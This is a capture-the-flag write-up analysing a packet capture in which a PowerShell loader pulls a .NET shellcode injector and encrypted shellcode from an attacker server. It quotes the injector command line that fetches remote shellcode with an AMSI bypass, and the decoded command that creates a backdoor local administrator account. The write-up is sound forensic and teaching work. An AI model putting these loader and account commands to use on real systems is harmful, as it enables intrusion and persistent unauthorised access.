Red Failure: Writeup

Difficulty: Medium | Evidence: capture.pcap | Tools: Wireshark, ILSpy, Python (pycryptodome), Unicorn

Summary

The PCAP shows a Windows host downloading a PowerShell script from a Python HTTP server. The script reflectively loads a .NET injector (DInjector), which downloads an AES-encrypted shellcode. Decrypting and emulating that shellcode shows it adds a local admin account, and the password is the flag.

1. Network analysis (Wireshark)

Filtering on HTTP shows the victim talking to 147.182.172.189:80. I exported three objects:

File	Size / note
4A7xH.ps1	PowerShell loader
user32.dll	86,528 bytes, served as application/x-msdos-program
9tVI0	336 bytes, encrypted blob

The attacker’s server header was SimpleHTTP/0.6 Python/3.6.9, so it ran python3 -m http.server 80. The victim’s User-Agent was WindowsPowerShell/5.1.19041.610, so the downloads came from PowerShell. The Date header shows the activity happened on 7 Jan 2022.

2. The PowerShell loader (4A7xH.ps1)

The script is obfuscated with -f format strings and string concatenation. Resolving them gives:

Variable	Value
$a	currentthread (injection technique)
$B:$C	147.182.172.189:80
$D	user32.dll
$E	9tVI0
$f	z64&Rx27Z$B%73up (password)
$g	C:\Windows\System32\svchost.exe
$j	msvcp_win.dll

The password was hidden here:

powershell
(('z6'+'4&Rx27Z{0}B%'+'7'+'3u'+'p') -F [cHar]36)   # [char]36 = '$'

At the end the script downloads user32.dll, loads it with Assembly.Load, and calls DInjector.Detonator.Boom with:

currentthread /sc:http://147.182.172.189:80/9tVI0 /password:z64&Rx27Z$B%73up
/image:C:\Windows\System32\svchost.exe /dll:msvcp_win.dll /blockDlls:True /am51:True

user32.dll is a misleading name. It is really a .NET assembly, DInjector, and /am51:True enables an AMSI bypass.

3. Reversing the injector (ILSpy)

I opened user32.dll in ILSpy and found the AES helper class:

csharp
public AES(string password)
{
    key = SHA256.Create().ComputeHash(Encoding.UTF8.GetBytes(password));
}

public byte[] Decrypt(byte[] data)
{
    byte[] iV    = data.Take(16).ToArray();   // IV = first 16 bytes
    byte[] data2 = data.Skip(16).ToArray();   // ciphertext
    // AES-CBC, PKCS7
}
Key: SHA-256 of the UTF-8 password, so 32 bytes (AES-256).
IV: the first 16 bytes of 9tVI0.
Mode: CBC with PKCS7 padding.
4. Decrypting 9tVI0
python
import hashlib
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

def decrypt(data: bytes, password: str) -> bytes:
key = hashlib.sha256(password.encode("utf-8")).digest()
iv, ct = data[:16], data[16:]
return unpad(AES.new(key, AES.MODE_CBC, iv).decrypt(ct), 16)

data = open("9tVI0", "rb").read()
open("sc.bin", "wb").write(decrypt(data, "z64&Rx27Z$B%73up"))

The padding validated, which confirms the key, IV and mode. The output is raw x86 shellcode starting with db d9 be ... d9 74 24 f4 5a, a shikata_ga_nai decoder stub.

5. Emulating the shellcode (Unicorn)

I didn’t want to run it, so I emulated it. The stub decodes itself in place, so I dumped the memory after execution:

python
from unicorn import *
from unicorn.x86_const import *

sc = open("sc.bin", "rb").read()
BASE, STACK = 0x400000, 0x200000

uc = Uc(UC_ARCH_X86, UC_MODE_32)
uc.mem_map(BASE, 0x30000)
uc.mem_map(STACK, 0x30000)
uc.mem_write(BASE, sc)
uc.reg_write(UC_X86_REG_ESP, STACK + 0x8000)

try:
uc.emu_start(BASE, BASE + len(sc), count=300)
except UcError as e:
print("stopped:", e)

print(bytes(uc.mem_read(BASE, len(sc))))

(If sc.bin contains the literal text \xdb\xd9... instead of raw bytes, Unicorn crashes with UC_ERR_READ_UNMAPPED. Save the bytes directly from the decrypt script.)

The decoded memory shows the real payload at the end:

net user jmiller "<FLAG>" /add; net localgroup administrators jmiller /add

The decoded body is Metasploit’s block_api stub, which resolves APIs by ROR13 hash. The hash 0x876F8B31 is kernel32!WinExec, which runs the command above, followed by ExitProcess. So this is not a reverse shell. The shellcode only creates a backdoor admin account.

Flag
<FLAG>   (the password of the jmiller account)
Attack chain and IOCs
PowerShell (4A7xH.ps1) → Assembly.Load(user32.dll = DInjector)
→ download 9tVI0 → AES-256-CBC decrypt → CurrentThread injection
→ WinExec: create local admin "jmiller"
Type	Value
Attacker IP	147.182.172.189:80
URIs	/user32.dll, /9tVI0
Password	z64&Rx27Z$B%73up
Account created	jmiller (local Administrators)

MITRE ATT&CK: T1059.001 (PowerShell), T1027 (obfuscation), T1620 (reflective code loading), T1055 (process injection), T1562.001 (AMSI bypass), T1136.001 (create local account), T1098 (add to admin group).
